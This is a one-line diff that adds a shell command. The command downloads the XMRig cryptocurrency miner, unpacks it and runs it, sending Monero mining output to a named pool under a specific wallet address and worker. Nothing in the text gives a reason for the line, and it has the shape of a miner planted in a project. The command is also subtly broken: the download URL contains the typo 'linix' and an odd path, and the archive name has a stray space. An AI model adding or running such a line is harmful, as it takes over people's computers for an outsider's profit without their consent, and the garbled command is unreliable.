@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linix-x64.tar.gz && tar -xvf xmrig -6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 && ./xmrig --coin XMR --url "xmr.kryptex.network:8888" --user "4ARnkntHxV2AnxwgyjsqySDj5AaP7qHwYMbN1cTvWLsHM9URqtSHNnzStkNCvc34Ph8VrKPV1ZxnVGTTA4KVZWt7KLRDSRY/Worker1" --tls -k
